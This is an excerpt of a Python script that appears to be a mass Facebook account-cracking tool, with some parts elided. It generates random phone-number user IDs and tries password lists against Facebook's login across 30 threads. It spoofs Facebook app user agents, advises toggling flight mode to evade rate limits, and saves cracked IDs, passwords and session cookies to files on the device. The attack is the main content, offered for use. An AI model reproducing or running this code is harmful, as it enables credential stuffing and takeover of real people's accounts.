...
def Main():
    ...
    elif manu in ['2','02']:os.system('xdg-open https://www.facebook.com/profile.php?id=100092649758771');Main()
    else:Main()
#-----------------------[ COUNTRY-CODE ]-----------------------#
def country():
...
def rndm_ind():
        ...
        for Kid in range(limit):Shahoxx = ''.join(random.choice(string.digits) for _ in range(7));user.append(Shahoxx)
        with tred(max_workers=30) as Shaho:
                tl = str(len(user))
                fresh();print(f' (+) Sim Code    : {code} \n (+) Total Limit : {limit} \n (+) Use Flight Mode Every 5 Minutes...');line()
                for love in user:
                        ids = code + love 
...
def rndmx(ids,pasx,tl):
        ...
        try:
                for pas in pasx:
                        ...
                        uaddx = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';["Mozilla/5.0 (Linux; Android 4.1.2; C5303 Build/12.0.A.1.257) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Mobile Safari/537.36"]'
                        ...
                        if 'session_key' in po:
                                ...
                                open('/sdcard/SHAHO-RNDM-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                ok.append(str(uid))
                                break
                        elif 'www.facebook.com' in po['error']['message']: 
                                uid = po['error']['error_data']['uid']
                                if 'y' in cpx:print(f'\r{r} (Fucking) {str(uid)} | {pas} ')
                                open('/sdcard/SHAHO-RNDM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                cp.append(str(uid))
                                break
                        else:continue
                loop+=1
